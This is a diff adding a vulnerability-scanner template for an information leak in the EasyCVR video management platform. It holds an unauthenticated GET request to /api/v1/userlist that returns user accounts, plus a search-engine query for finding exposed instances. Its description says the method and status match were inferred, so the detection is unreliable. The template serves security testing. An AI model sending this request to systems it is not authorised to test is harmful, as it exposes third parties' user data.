@@ -1,0 +1,23 @@
+id: poc-426d2996870a3598fff8
+info:
+  name: EasyCVR视频管理平台userlist存在信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/426d2996870a3598fff8c02d4d18ad64
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 426d2996870a3598fff8c02d4d18ad64
+    fofa: + hunter`web.title="EasyCVR"`
+http:
+- raw:
+  - 'GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
